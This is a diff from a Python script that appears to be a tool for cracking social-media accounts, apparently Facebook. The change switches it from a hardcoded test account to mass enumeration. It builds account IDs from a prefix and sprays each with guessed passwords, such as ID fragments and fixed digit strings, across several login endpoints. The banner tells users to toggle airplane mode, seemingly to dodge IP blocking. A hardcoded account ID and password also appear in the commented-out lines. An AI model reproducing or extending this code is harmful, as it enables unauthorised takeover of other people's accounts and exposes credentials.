@@ -1123,11 +1123,11 @@ def SUMON2():
         print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for guru in user:
-            #uid = kode+guru
-            #mk = uid[:6]
-            #pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
-            uid ='61566172784110'
-            pwx ='sumon@12M'
+            uid = kode+guru
+            mk = uid[:6]
+            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
+            #uid ='61566172784110'
+            #pwx ='sumon@12M'
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
